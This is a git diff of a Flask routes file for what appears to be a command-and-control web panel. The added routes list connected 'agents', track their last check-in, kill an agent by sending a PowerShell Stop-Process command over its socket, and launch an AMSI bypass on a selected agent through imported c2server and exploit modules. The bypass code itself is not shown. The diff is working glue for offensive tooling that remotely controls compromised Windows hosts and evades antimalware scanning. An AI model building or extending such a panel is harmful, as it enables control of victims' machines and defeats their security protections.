@@ -1,14 +1,14 @@
 
 from apps.home import blueprint
-from flask import render_template, request, jsonify
+from flask import render_template, request, jsonify, redirect, url_for
 from flask_login import login_required
 from jinja2 import TemplateNotFound
 from apps import db
 from apps.home.db import allAgents
-import sqlite3
+from c2server.server import *
+from exploit.operation import *
 # from exploit import attacker
 
-'''
 @blueprint.route('/')
 def index():
     agents = allAgents.query.all()
@@ -19,66 +19,93 @@ def operations():
     agents = allAgents.query.all()
     return render_template('home/operations.html', agents=agents)
 
-@blueprint.route('/execute_operation', methods=['POST'])
-def execute_script():
-    arg = request.form.to_dict()
-    agent = arg['agent_select']
-    operation = arg['operation']
-    result = attacker.amsi_execute()
-    return jsonify(result=result)
-
-
 @blueprint.route('/agents.html', methods=["GET"])
 def agents_info():
     agents = allAgents.query.all()
     return render_template('home/agents.html', agents=agents)
 
-@blueprint.route('/updateStatus', methods=['PUT'])
-def udpateStatus():
-    data = request.get_json()
-    button_id = data.get('id')
-    id = button_id.split("button-")[1]
-    conn = sqlite3.connect('./apps/db.sqlite3')
-    print(button_id)
-    print(id)
-    conn.execute("UPDATE all_agents SET status='Dead' WHERE id=?", id)
-    conn.commit()
-    # agents = allAgents.query.all()
-    conn.close()
-    # return render_template('home/agents.html', agents=agents)\
-    return jsonify({"Message":"Data Status Updated"}) , render_template('home/agents.html')
-'''
-
-# Helper - Extract current page name from request
-def get_segment(request):
+@blueprint.route("/update_connections", methods=["GET"])
+def update_connections():
     try:
-        segment = request.path.split('/')[-1]
+        with connections_lock:
+            if connections != []:
+                for conn in connections:
+                    lastSeen = int(time.time() - conn[2])
+                    db.execute("UPDATE all_agents SET lastCheckin=? where identifier=?", (lastSeen, conn[6]))
+                db.commit()
+            clients = db.execute("SELECT * FROM all_agents").fetchall()
+            # Convert list of tuples to list of lists
+            clients_list = [list(client) for client in clients]   
+        return jsonify({"clients": clients_list})
+    except OSError:
+        time.sleep(5)
 
-        if segment == '':
-            segment = 'index'
-
-        return segment
-
-    except:
-        return None
-
-@blueprint.route('/<template>')
-def route_template(template):
-
+@blueprint.route("/terminate_connections/<id>", methods=["POST"])
+def terminate_connections(id):
+    client_id = db.execute("SELECT identifier FROM all_agents WHERE status='Alive' and id=?", id).fetchone()
+    client_id = str(client_id[0])
     try:
+        with connections_lock:
+            if connections != []:
+                for conn in connections:
+                    if conn[6] == client_id:
+                        conn[1].send(b"\n")
+                        time.sleep(1)
+                        conn[1].send("Stop-Process -Name 'agent'".encode() + b"\n")
+                        conn[1].recv(1048)
+                        db.execute("DELETE FROM all_agents where id=?", id)
+                        db.commit()
+                        return redirect(request.referrer)
+                    else:
+                        return """
+                            <script>
+                                window.alert("No Matching Identifier");
+                                window.location.href = document.referrer;
+                            </script>"""
+            else:
+                return """
+                    <script>
+                        window.alert("No Active Connections, Check Agents");
+                        window.location.href = document.referrer;
+                    </script>"""
+    except OSError:
+        time.sleep(5)
 
-        if not template.endswith('.html'):
-            template += '.html'
-
-        # Detect the current page
-        segment = get_segment(request)
-
-        # Serve the file (if exists) from app/templates/home/FILE.html
-        return render_template("home/" + template, segment=segment)
-
-    except TemplateNotFound:
-        return render_template('home/page-404.html'), 404
-
-    except:
-        return render_template('home/page-500.html'), 500
-
+@blueprint.route("/execute_amsi", methods=["POST"])
+def execute_amsi():
+    arg = request.form.to_dict()
+    if arg != {}:
+        agent = arg['selected_agent']
+        client_id = db.execute("SELECT identifier FROM all_agents WHERE id=?", agent).fetchone()
+        client_id = str(client_id[0])
+        try:
+            with connections_lock:
+                if connections != []:
+                    for conn in connections:
+                        if conn[6] == client_id:
+                            amsi_bypass(conn)
+                            return """
+                                <script>
+                                    window.alert("AMSI Bypass Executed");
+                                    window.location.href = document.referrer;
+                                </script>"""
+                        else:
+                            return """
+                                <script>
+                                    window.alert("No Matching Identifier");
+                                    window.location.href = document.referrer;
+                                </script>"""
+                else:
+                    return """
+                        <script>
+                            window.alert("No Active Connections, Check Agents");
+                            window.location.href = document.referrer;
+                        </script>"""
+        except OSError:
+            time.sleep(5)
+    else:
+        return """
+        <script>
+            window.alert("No Agent Selected");
+            window.location.href = document.referrer;
+        </script>"""
